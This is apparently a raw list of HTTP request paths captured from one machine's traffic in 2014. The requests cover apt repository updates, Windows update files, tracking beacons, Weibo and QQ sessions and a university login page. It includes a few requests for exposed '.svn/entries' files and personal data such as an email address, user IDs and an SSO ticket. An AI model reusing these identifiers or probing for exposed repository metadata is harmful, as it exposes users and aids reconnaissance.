+/a.js?ch=0&jk=f95962ed9459c841&n=16site_ik_cpr&tu=u1510808&word=http://bbs.shendu.com/thread-1880527-1-1.html&if=0&aw=600&ah=80&pt=351174&it=0&vt=0&csp=1600,860&bcl=1583,775&pof=1583,1982&top=1866&left=265&total=2&rdm=1417222211729
+/linux/chrome/deb/dists/stable/Release.gpg
+/socket.io/1/xhr-polling/DFxgXjA3dhb42LG9pWJb?t=1417222219765
+/linux/chrome/deb/dists/stable/Release
+/project/ubuntuzilla/mozilla/apt/dists/all/Release.gpg
+/kali-security/dists/kali/updates/Release.gpg
+/kali/dists/kali/Release.gpg
+/linux/chrome/deb/dists/stable/main/binary-i386/Packages.bz2
+/wp-content/themes/twentytwelve/js/navigation.js?ver=1.0
+/linux/chrome/deb/dists/stable/main/i18n/Translation-en_US.bz2
+/stat?mid=699f274115930bec6e838e3c0ec1551a&type=106&k1=11&k2=3.2.0.2010&src=360zip
+/stat?mid=699f274115930bec6e838e3c0ec1551a&type=ys100&k1=1&k2=3.2.0.2010&src=360zip
+/linux/chrome/deb/dists/stable/main/i18n/Translation-en.bz2
+/v.gif?pid=307&type=3071&sc=1287,661,1304,768&desturl=http://zone.wooyun.org/act-new&apitype=1&linkid=i329ifov6iz&velo_load=32&velo_cssload=17&velo_jsLoad=25&cite_uid=&cite_type=1&cite_mini=0
+/linux/chrome/deb/dists/stable/main/i18n/Translation-en_US.xz
+/ivps9x/part-jrog2-c0f.vpx
+/linux/chrome/deb/dists/stable/main/i18n/Translation-en.xz
+/stat.php?id=4776238&web_id=4776238&show=pic1
+/project/ubuntuzilla/mozilla/apt/dists/all/Release.gpg
+/v.gif?pid=307&type=3075&l=344824&t=0&s=344824&v=775&f=2000&r=http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=deepin%20linux%20%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip&rsv_pq=a2f02b8800068a63&rsv_t=483fpTubvX34op21p1YM%2B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A&rsv_enter=1&inputT=8441&rsv_sug3=54&rsv_sug4=2801&rsv_sug1=21&rsv_sug2=0&u=http://blog.csdn.net/stephenzhu/article/details/6417453
+/v.gif?pid=307&type=3075&l=344024&t=0&s=344024&v=775&f=2000&r=http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=deepin%20linux%20%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip&rsv_pq=a2f02b8800068a63&rsv_t=483fpTubvX34op21p1YM%2B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A&rsv_enter=1&inputT=8441&rsv_sug3=54&rsv_sug4=2801&rsv_sug1=21&rsv_sug2=0&u=http://blog.csdn.net/stephenzhu/article/details/6417453
+/linux/chrome/deb/dists/stable/main/i18n/Translation-en_US.lzma
+/Login/userpage
+/kali-security/dists/kali/updates/Release.gpg
+/kali-security/dists/kali/updates/Release
+/linux/chrome/deb/dists/stable/main/i18n/Translation-en.lzma
+/kali/dists/kali/Release.gpg
+/v3/360zipupd.cab
+/kali/dists/kali/Release
+/linux/chrome/deb/dists/stable/main/i18n/Translation-en_US.gz
+/project/ubuntuzilla/mozilla/apt/dists/all/Release
+/linux/chrome/deb/dists/stable/main/i18n/Translation-en.gz
+/2/remind/unread_count.json?uid=1992245353&unread_message=1&group_id=221102260100003958&source=140226478
+/linux/chrome/deb/dists/stable/main/i18n/Translation-en_US
+/kali-security/dists/kali/updates/Release
+/kali-security/dists/kali/updates/main/binary-i386/Packages.gz
+/linux/chrome/deb/dists/stable/main/i18n/Translation-en
+/kali/dists/kali/Release
+/project/ubuntuzilla/mozilla/apt/dists/all/Release
+/kali/dists/kali/main/source/Sources.gz
+/v.gif?pid=307&type=3075&l=293993&t=0&s=293993&v=775&f=0&r=http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=deepin%20linux%20%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip&rsv_pq=a2f02b8800068a63&rsv_t=483fpTubvX34op21p1YM%2B8r13IGGinSMSaE45zSnppXln9vcMnCIyPhln7A&rsv_enter=1&inputT=8441&rsv_sug3=54&rsv_sug4=2801&rsv_sug1=21&rsv_sug2=0&u=http://www.it165.net/os/html/201212/4017.html
+/kali-security/dists/kali/updates/contrib/binary-i386/Packages.gz
+/Login/inner_announce
+/kali-security/dists/kali/updates/main/binary-i386/Packages.gz
+/project/ubuntuzilla/mozilla/apt/dists/all/main/binary-i386/Packages.gz
+/Login/.svn/entries
+/
+/Login/inner_announce
+/kali/dists/kali/non-free/source/Sources.gz
+/answer?id=254473&bi=1&sohuurl=http://www.it165.net/os/html/201212/4017.html&rnd=55d3675584f024f0&if=16&w=728&h=90&js=c&z=701629ce7cabc1f8&pt=150402&ps=20141129085013936&it=150402&vs=1&ft=18402&vt=150402&left=272&top=300&op=100&csp=1600,860&bcl=1583,775&pof=1583,2865&fs=1&total=4
+/answer?id=254882&bi=2&sohuurl=http://www.it165.net/os/html/201212/4017.html&rnd=55d3675584f024f0&if=16&w=728&h=90&js=c&z=61001dfb99b78701&pt=150401&ps=20141129085013936&it=0&vs=0&ft=18401&vt=0&left=272&top=2228&op=100&csp=1600,860&bcl=1583,775&pof=1583,2865&fs=1
+/answer?id=155403&bi=3&sohuurl=http://www.it165.net/os/html/201212/4017.html&rnd=55d3675584f024f0&if=16&w=300&h=250&js=c&z=400a7b77ae34c4f7&pt=150401&ps=20141129085013936&it=149901&vs=1&ft=18401&vt=149901&left=1020&top=211&op=100&csp=1600,860&bcl=1583,775&pof=1583,2865&fs=1
+/answer?id=155403&bi=4&sohuurl=http://www.it165.net/os/html/201212/4017.html&rnd=55d3675584f024f0&if=16&w=300&h=250&js=c&z=f0d07bdb26923efa&pt=150401&ps=20141129085013936&it=0&vs=0&ft=18401&vt=0&left=1020&top=2243&op=100&csp=1600,860&bcl=1583,775&pof=1583,2865&fs=1
+/project/ubuntuzilla/mozilla/apt/dists/all/main/binary-i386/Packages.gz
+/kali-security/dists/kali/updates/non-free/binary-i386/Packages.gz
+/ivps9x/part-vps_win32-14112801.vpx
+/themes/wooyun/css/style.css
+/source/js/jquery.js
+/kali/dists/kali/main/source/Sources.gz
+/themes/wooyun/images/logo.png
+/upload/avatar/avatar_5517.jpg
+/upload/avatar/avatar_4166.jpg
+/upload/avatar/avatar_203.jpg
+/upload/avatar/avatar_1011.jpg
+/upload/avatar/avatar_1588.jpg
+/kali/dists/kali/contrib/source/Sources.gz
+/upload/avatar/avatar_786.jpg
+/upload/avatar/avatar_626.jpg
+/upload/avatar/avatar_4.jpg
+/themes/wooyun/images/v-15.png
+/upload/avatar/avatar_50.jpg
+/upload/avatar/avatar_1537.jpg
+/upload/avatar/avatar_5571.jpg
+/upload/avatar/avatar_1585.jpg
+/upload/avatar/avatar_4530.jpg
+/upload/avatar/avatar_4137.jpg
+/upload/avatar/avatar_4332.jpg
+/upload/avatar/avatar_1146.jpg
+/upload/avatar/avatar_3721.jpg
+/upload/avatar/avatar_1375.jpg
+/upload/avatar/avatar_4_s.jpg
+/upload/avatar/avatar_67_s.png
+/upload/avatar/avatar_197_s.jpg
+/upload/avatar/avatar_10_s.jpg
+/upload/avatar/avatar_398_s.jpg
+/project/ubuntuzilla/mozilla/apt/dists/all/main/i18n/Translation-en_US.bz2
+/upload/avatar/avatar_21_s.jpg
+/ivps9x/iplugins-3-2.vpx
+/upload/avatar/avatar_255_s.png
+/upload/avatar/avatar_3443_s.jpg
+/upload/avatar/avatar_969_s.jpg
+/upload/avatar/avatar_426_s.jpg
+/upload/avatar/avatar_251_s.jpg
+/upload/avatar/avatar_5056_s.jpg
+/upload/avatar/avatar_1855_s.jpg
+/upload/avatar/avatar_628_s.jpg
+/upload/avatar/avatar_1470_s.jpg
+/upload/avatar/avatar_947_s.jpg
+/upload/avatar/avatar_30_30.png
+/upload/avatar/avatar_1180_s.jpg
+/information/rank
+/upload/avatar/avatar_4451_s.jpg
+/upload/avatar/avatar_1242_s.jpg
+/upload/avatar/avatar_5301_s.jpg
+/kali-security/dists/kali/updates/contrib/i18n/Translation-en_US.bz2
+/upload/avatar/avatar_5246_s.jpg
+/upload/avatar/avatar_964_s.jpg
+/themes/wooyun/images/bg.png
+/themes/wooyun/images/navBg.png
+/themes/wooyun/images/search.png
+/themes/wooyun/images/liBg.gif
+/information/.svn/entries
+/Login
+/favicon.ico
+/kali/dists/kali/main/binary-i386/Packages.gz
+/information/rank
+/kali-security/dists/kali/updates/contrib/i18n/Translation-en.bz2
+/project/ubuntuzilla/mozilla/apt/dists/all/main/i18n/Translation-en.bz2
+/kali/dists/kali/non-free/binary-i386/Packages.gz
+/kali-security/dists/kali/updates/main/i18n/Translation-en_US.bz2
+/notification/0.6/rules_sincefx4.json
+/kali-security/dists/kali/updates/main/i18n/Translation-en.bz2
+/kali/dists/kali/contrib/binary-i386/Packages.gz
+/project/ubuntuzilla/mozilla/apt/dists/all/main/i18n/Translation-en_US.xz
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en_US.bz2
+/kali/dists/kali/contrib/i18n/Translation-en_US.bz2
+/在mac系统中编译android源码与模拟器内核goldfish
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en.bz2
+/project/ubuntuzilla/mozilla/apt/dists/all/main/i18n/Translation-en.xz
+/d/msdownload/update/others/2014/11/15635252_0102235e229929457aca95a9eee198efc5b9b189.cab
+/kali/dists/kali/contrib/i18n/Translation-en.bz2
+/zh_CN/htmledition/images/ico_cheat104474.gif
+/
+/kali-security/dists/kali/updates/contrib/i18n/Translation-en_US.xz
+/d/msdownload/update/others/2014/11/15635349_92a940dd769b2e3b4e6fbfc634be40953a27d50d.cab
+/ivps9x/jrog2-c0b-c0a.vpx
+/service/newMessage/934176877@qq.com/1/0/0/0/0
+/sso/login.php?url=http://weibo.com/&_rand=1417222224.8372&gateway=1&service=miniblog&entry=miniblog&useticket=1&returntype=META&_version_=sinasso_weiboclient_1.5
+/d/msdownload/update/others/2014/11/15635413_76688e5929aa67df5c316c775c63bea83589fa4d.cab
+/d/msdownload/update/others/2014/11/15635422_4b64cf4d9faaa3e734c470b51030c9c14e566d17.cab
+/kali/dists/kali/main/i18n/Translation-en_US.bz2
+/ivps9x/jrog2-c0c-c0b.vpx
+/sso/crosdom?action=login&savestate=1448758224&callback=sinaSSOController.doCrossDomainCallBack&scriptId=ssoscript0&client=ssologin.js(v1.4.2)&_=1417222225158
+/kali-security/dists/kali/updates/contrib/i18n/Translation-en.xz
+/d/msdownload/update/others/2014/11/15634711_bacc7830bbdccbd824466bfdfe25e7bf379dcb0e.cab
+/wbsso/login?ssosavestate=1448758224&url=http://weibo.com/&ticket=ST-MjQwNDgzNTg0NQ==-1417222224-xd-091B69156079E5836FDDD19736CF03F3&retcode=0
+/ivps9x/jrog2-c0d-c0c.vpx
+/c/msdownload/update/others/2014/11/15636188_64677b4ce59cdda27bc79882bf0db57fcc2aef98.cab
+/project/ubuntuzilla/mozilla/apt/dists/all/main/i18n/Translation-en_US.lzma
+/poll?r=0.1924130136558403&u=345402597&s=7&k=-olgoDNk5WyWFNdd&t=0&i=30&r=0.45294442967457826
+/kali/dists/kali/main/i18n/Translation-en.bz2
+/d/msdownload/update/others/2014/11/15635104_6b0f09b6a4b14727938faa8f15ebbfbe2494bb72.cab
+/ivps9x/jrog2-c0e-c0d.vpx
+/avatar/36241D86F96C3412AB384A93E7ABB42?d=http://res.mail.qq.com/zh_CN/htmledition/images/rss/male.gif
+/kali-security/dists/kali/updates/main/i18n/Translation-en_US.xz
+/d/msdownload/update/others/2014/11/15635654_e8ef4da073d9341df3ee39cf099e37b4d889131e.cab
+/t6/style/css/module/base/frame.css?version=376bad91e8444277
+/t6/style/css/module/combination/home_A.css?version=376bad91e8444277
+/t6/skin/skin050/skin.css?version=376bad91e8444277
+/js/registrar.js
+/kali/dists/kali/non-free/i18n/Translation-en_US.bz2
+/t6/skin/skin050/images/body_bg.jpg?id=1410943047113
+/t6/style/images/global_nav/WB_logo.png?id=1404211047727
+/d/msdownload/update/others/2014/11/15635960_bd6b27b3a52649c0d650caaf984a2a47e735b02c.cab
+/t6/home/js/pl/lib.js?version=b36e9becbcaa87cb
+/kali-security/dists/kali/updates/main/i18n/Translation-en.xz
+/ivps9x/jrog2-c0f-c0e.vpx
+/d/msdownload/update/others/2014/11/15709528_f7f90c173b3a83a698e4e6f587062c11c8645096.cab
+/t6/home/js/pl/top/index.js?version=b36e9becbcaa87cb
+/project/ubuntuzilla/mozilla/apt/dists/all/main/i18n/Translation-en.lzma
+/stat?mid=699f274115930bec6e838e3c0ec1551a&type=106&k1=4&k2=3.2.0.2010&src=360zip
+/kali/dists/kali/non-free/i18n/Translation-en.bz2
+/d/msdownload/update/others/2014/11/15634869_66037914784372dffde24fb9d5aac59ba6236217.cab
+/stat?mid=699f274115930bec6e838e3c0ec1551a&type=102&f0=3.2.0.2010&f5=c0b0c2-0-1&src=360zip
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en_US.xz
+/d/msdownload/update/others/2014/11/15635074_6b590c6c39bc8dfc062dce27de9992e0602ad67c.cab
+/stat?mid=699f274115930bec6e838e3c0ec1551a&type=ys100&k1=1&k2=3.2.0.2010&src=360zip
+/res.mail.qq.com/zh_CN/htmledition/images/rss/male.gif
+/apps/domainpark/show_afd_ads.js
+/kali/dists/kali/contrib/i18n/Translation-en_US.xz
+/d/msdownload/update/others/2014/11/15635162_4f988b2d4ce071dca4355fa1d8792ac948264262.cab
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en.xz
+/Login/inner_announce
+/project/ubuntuzilla/mozilla/apt/dists/all/main/i18n/Translation-en_US.gz
+/kali/dists/kali/contrib/i18n/Translation-en.xz
+/kali-security/dists/kali/updates/contrib/i18n/Translation-en_US.lzma
+/t6/home/js/pl/frame/index.js?version=b36e9becbcaa87cb
+/apps/domainpark/domainpark.cgi?callback=_google_json_callback&output=js&client=ca-dp-oversee_ncd&domain_name=www.w3c.com.cn&st=create&drid=as-drid-2578124767373827&s=www.w3c.com.cn&dt=1417222226391&u_tz=480&u_his=1&u_h=900&u_w=1440&frm=0
+/kali/dists/kali/main/i18n/Translation-en_US.xz
+/kali-security/dists/kali/updates/contrib/i18n/Translation-en.lzma
+/project/ubuntuzilla/mozilla/apt/dists/all/main/i18n/Translation-en.gz
+/kali/dists/kali/main/i18n/Translation-en.xz
+/index.php?do=user&act=remind
+/yinghuihong/article/details/9240695
+/source/global.js.php
+/safe_update
+/adu-1.gif?channelid=full.firefox.com.cn&fxversion=27.0.1&ceversion=2014.2&ver=2_2&pk={e81d48e2-0120-4d18-b25f-dc7b48fd8c8b}&uk={9502a616-6b26-4c7a-8391-70cb231bec6e}&cehome=false&locale=zh-CN&moexts=cemigration,cpmanager,cehomepage&age=254&default=false&flash=13.0.0.182&now=1417222228942
+/kali/dists/kali/non-free/i18n/Translation-en_US.xz
+/project/ubuntuzilla/mozilla/apt/dists/all/main/i18n/Translation-en_US
+/kali/dists/kali/non-free/i18n/Translation-en.xz
+/kali-security/dists/kali/updates/main/i18n/Translation-en.lzma
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en_US.lzma
+/project/ubuntuzilla/mozilla/apt/dists/all/main/i18n/Translation-en
+/pki/mscorp/crl/mswww(6).crl
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en.lzma
+/kali/dists/kali/contrib/i18n/Translation-en.lzma
+/kali-security/dists/kali/updates/contrib/i18n/Translation-en_US.gz
+/ajax/jsonp/suggestion?ver=1&isnew=1&lang=zh-cn&_cb=STK_14172222258884
+/kali/dists/kali/main/i18n/Translation-en_US.lzma
+/kali-security/dists/kali/updates/contrib/i18n/Translation-en.gz
+/kali-security/dists/kali/updates/contrib/binary-i386/Packages.gz
+/kali/dists/kali/non-free/source/Sources.gz
+/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?83a26d3bffc6c715
+/ivps9x/vps_32-ed2-ed1.vpx
+/kali/dists/kali/main/i18n/Translation-en.lzma
+/kali-security/dists/kali/updates/non-free/binary-i386/Packages.gz
+/kali-security/dists/kali/updates/main/i18n/Translation-en_US.gz
+/kali/dists/kali/contrib/source/Sources.gz
+/poll?r=0.47387220594100654&u=648629762&s=7&k=H3mhqTxNAk6pJpqp&t=0&i=30&r=0.5303118689917028
+/kali/dists/kali/main/binary-i386/Packages.gz
+/kali/dists/kali/non-free/i18n/Translation-en_US.lzma
+/t6/home/js/pl/nav/group/index.js?version=b36e9becbcaa87cb
+/kali-security/dists/kali/updates/main/i18n/Translation-en.gz
+/kali/dists/kali/non-free/i18n/Translation-en.lzma
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en_US.gz
+/kali/dists/kali/contrib/i18n/Translation-en_US.gz
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en.gz
+/ivps9x/vps_32-ed3-ed2.vpx
+/
+/kali/dists/kali/contrib/i18n/Translation-en.gz
+/kali-security/dists/kali/updates/contrib/i18n/Translation-en_US
+/kali/dists/kali/main/i18n/Translation-en_US.gz
+/kali-security/dists/kali/updates/contrib/i18n/Translation-en
+/Login/self_information
+/kali/dists/kali/main/i18n/Translation-en.gz
+/kali-security/dists/kali/updates/main/i18n/Translation-en_US
+/Login/userpage
+/Login/self_information
+/static/css/index/userpage.css
+/static/image/logout_icon_2.png
+/kali/dists/kali/non-free/i18n/Translation-en_US.gz
+/kali-security/dists/kali/updates/main/i18n/Translation-en
+/gchatpic_new/2601200585/2601200585-3192350109-FF59A84D4325B31CB170CB3F3847324D/0?vuin=648629762&term=1
+/ivps9x/vps_32-ed4-ed3.vpx
+/gchatpic_new/2601200585/2601200585-3279090525-BF07FD111DE81849592F05C5A4BFACEC/0?vuin=648629762&term=1
+/gchatpic_new/2601200585/2601200585-3142358824-3E69A71B4A3649263CA368A28C2C2C40/0?vuin=648629762&term=1
+/kali/dists/kali/non-free/i18n/Translation-en.gz
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en_US
+/gchatpic_new/2601200585/2601200585-3438496810-50145AE5F1162D307D5103601C5A2E33/0?vuin=648629762&term=1
+/gchatpic_new/2601200585/2601200585-375267911-8E2B178A30B492C36441EDB1D5319544/0?vuin=648629762&term=1
+/kali/dists/kali/contrib/i18n/Translation-en_US
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en
+/gchatpic_new/2601200585/2601200585-2087002883-104A157F925CD26E6C1B1DA7D1A4876F/0?vuin=648629762&term=1
+/ivps9x/vps_32-ed5-ed4.vpx
+/kali/dists/kali/contrib/i18n/Translation-en
+/Login/inner_announce
+/kali-security/dists/kali/updates/non-free/i18n/Translation-en
+/web/web_mobile/iphone/pcqq_iphone.png
+/qqfile/status/qqcam-logo.png
+/qqfile/status/multi.png
+/qqfile/status/QQservice20.png
+/qqfile/status/wx.png
+/qqfile/status/win8push.png
+/kali/dists/kali/main/i18n/Translation-en_US
+/gh/9012628/9012628/41"
+/qqweb/appbox/appinfo?appids=1002
+/pkiops/crl/Microsoft Update Signing CA 2.3.crl
+/kali/dists/kali/main/i18n/Translation-en
+/gh/139824008/139824008/41"
+/kali/dists/kali/non-free/i18n/Translation-en_US
+/kali/dists/kali/non-free/i18n/Translation-en
+/gh/24733986/24733986/41"
+/club/item/font/RecommendList.xml
+/gh/179265080/179265080/41"
+/checkupdate
+/checkupdate/
+/ivps9x/vps_32-ed6-ed5.vpx
+/gh/184517991/184517991/41"
+/gh/375995060/375995060/41"
+/gh/247807740/247807740/41"
+/information/rank
+/gh/278153868/278153868/41"
+/simple/ecdsa/
+/pubfooter/js/tracking.js
+/rabbit/search-service/main.js
+/skin/dark1/css/style.css?v=1.1
+/css/style1.css
+/rabbit/cnick/cnick.js
+/pubfooter/js/repoAddr.js
+/scripts/jquery.js
+/comm_ask/css/ask_float_block.css
+/css/comment1.css
+/scripts/ad.js?v=1.1
+/scripts/SyntaxHighlighter/styles/default.css
+/comm_ask/js/libs/wmd.js
+/public/common/toolbar/js/html.js
+/public/common/toolbar/css/index.css
+/public/common/toolbar/js/toolbar.js
+/js/jquery.cookie.js
+/scripts/comment.js
+/scripts/newblog.min.js
+/scripts/JavaScript1.js
+/comm_ask/js/libs/showdown.js
+/comm_ask/js/libs/prettify.js
+/46aae4d1e2371e4aa769798941cef698/allmobilize.min.js
+/comm_ask/js/apps/ask_float_block.js
+/showblogmedal.ashx?blogid=1452458
+/content/loginbox/login.js
+/ui/scripts/Csdn/counter.js
+/js/count.js
+/scripts/ad-blog.js
+/gh/295248358/295248358/41"
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php
+/cas/j/jquery.toggle.js
+/cas/j/jquery-1.6.1.min.js
+/cas/j/md5.js
+/cas/j/login.js
+/cas/c/login_i.css
+/cas/c/loginpage.css
+/cas/i/comm/nb_logo.png
+/cas/i/comm/nb_logo_s.png
+/cas/i/comm/logon_head_bg.png
+/cas/i/comm/help_gray_icon.png
+/cas/i/comm/logon_bg_btn.png
+/cas/i/comm/ng_bg.jpg
+/cas/i/comm/login_foot_bg.png
+/favicon.ico
